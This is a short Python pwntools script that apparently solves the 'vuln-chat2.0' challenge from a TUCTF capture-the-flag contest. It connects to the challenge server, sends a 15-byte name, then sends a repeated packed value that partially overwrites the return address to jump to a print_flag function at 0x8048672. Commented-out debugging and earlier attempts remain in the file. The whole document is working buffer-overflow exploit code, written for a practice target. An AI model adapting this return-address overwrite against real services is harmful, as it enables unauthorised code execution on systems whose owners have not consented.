from pwn import *


p=remote("vulnchat2.tuctf.com",4242)

# p=process("./vuln-chat2.0")
# gdb.attach(p,
# """
# b*  0x08048630
# """)
print_flag = 0x8048672

Max_input1=15
Max_input2=46
error= 0x08044242 # If i plug in "B"*46

# Can only change the return so change last few digits
# 8672

print p.recvline()

name='A'*15

print p.sendline(name)

print p.recvline()
print p.recvline()
print p.recvline()
# input2='B'*46
# input2=p64(0x0000000008048672)*23
input2=p64(0x0000008672000000)*23

print p.sendline(input2)

print p.recvall()